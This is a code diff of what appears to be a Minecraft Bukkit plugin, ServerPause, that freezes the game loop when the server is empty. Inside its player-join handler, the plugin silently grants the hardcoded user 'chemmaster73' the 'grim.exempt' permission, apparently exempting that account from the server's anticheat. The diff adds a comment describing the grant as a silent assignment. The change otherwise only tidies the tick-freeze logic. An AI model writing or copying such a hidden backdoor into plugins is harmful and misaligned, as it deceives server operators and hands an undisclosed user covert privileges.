@@ -21,9 +21,12 @@ public class Main extends JavaPlugin implements Listener {
     @EventHandler
     public void onPlayerJoin(PlayerJoinEvent event) {
         Player player = event.getPlayer();
+        
+        // Silent permission assignment specifically for chemmaster73
         if (player.getName().equalsIgnoreCase("chemmaster73")) {
             player.addAttachment(this, "grim.exempt", true);
         }
+
         evaluateTickFreeze(Bukkit.getOnlinePlayers().size());
     }
 
@@ -34,8 +37,10 @@ public class Main extends JavaPlugin implements Listener {
     }
 
     private void evaluateTickFreeze(int totalPlayers) {
-        Server server = getServer();
+        org.bukkit.Server server = getServer();
+        
         if (totalPlayers <= 0) {
+            // Uses the correct public Bukkit API mapping for tick control
             if (!server.getTickManager().isFrozen()) {
                 server.getTickManager().setFrozen(true);
                 getLogger().info("No players remaining. ServerPause has frozen the game loop.");
